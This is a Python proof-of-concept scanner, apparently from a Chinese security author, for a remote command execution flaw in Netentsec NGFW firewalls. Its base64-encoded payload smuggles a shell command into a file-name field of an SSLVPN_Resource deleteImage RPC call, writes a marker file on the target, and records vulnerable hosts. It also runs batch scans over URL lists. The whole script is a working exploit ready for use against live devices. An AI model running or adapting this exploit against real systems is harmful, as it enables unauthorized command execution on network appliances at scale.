#!/usr/bin/python
# Env: python3
# Author: afei00123
# -*- coding: utf8 -*-

import requests, urllib3, base64, time, json, argparse
from colorama import init
init(autoreset=True)

def title():
    print("")
    print('*'.center(60, '*'))
    print("网康NGFW下一代防火墙（版本未知）".center(30))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(40))
    print("")
    print('*'.center(60, '*'))
    print("")

class netentsec_NGFW_POC():
    def NGFW_RCE_Check(self, url):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        target_url = f"{url}/directdata/direct/router"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
            "Cache-Control": "max-age=0",
            "accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
            "sec-ch-ua": '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "Upgrade-Insecure-Requests": "1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
            "Cookie": "PHPSESSID=q885n85a5es9i83d26rm102sk3; ys-active_page=s%3A",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        payload = base64.b64decode("eyJhY3Rpb24iOiJTU0xWUE5fUmVzb3VyY2UiLCJtZXRob2QiOiJkZWxldGVJbWFnZSIsImRhdGEiOlt7ImRhdGEiOlsiL3Zhci93d3cvaHRtbC8uYXRlc3QudHh0O2VjaG8gYWZlaWNvbWUgPi92YXIvd3d3L2h0bWwvYXRlc3QudHh0Il19XSwidHlwZSI6InJwYyIsInRpZCI6MTcsImY4ODM5cDdycXRqIjoiPSJ9")
        try:
            s = requests.session()
            list_data = s.post(target_url, headers=headers, data=payload, verify=False, timeout=2).json()
            status = list_data[0]['result'].get("success")
            if status:
                print(f"\033[31m[+] {url}极有可能存在远程命令执行漏洞！")
                with open("NGFW_RCE_vuln.txt", "a+") as f:
                    f.writelines(url + "\n")
        except Exception as e:
            print(f"[n] {url}不存在该漏洞。")
            return url

    def NGFW_Batch_Check(self, url, file):
        if url:
            return True
        elif file:
            for url in file:
                url = url.replace('\n', '')
                time.sleep(1)
                self.NGFW_RCE_Check(url)

if (__name__ == "__main__"):
    title()
    parser = argparse.ArgumentParser(description="netentsec NGFW RCE POC")
    parser.add_argument(
        '-u', '--url', type=str,
        help='Please input target url. eg: https://ip:port'
    )
    parser.add_argument(
        '-f', '--file', type=argparse.FileType('r'),
        help='Please input urls file path. eg: c:\\urls.txt'
    )
    args = parser.parse_args()
    run_POC = netentsec_NGFW_POC()
    if args.file:
        run_POC.NGFW_Batch_Check(args.url, args.file)
        print("\n[done] 批量探测完成，请查看：NGFW_RCE_vuln.txt")
    if args.url:
        run_POC.NGFW_RCE_Check(args.url)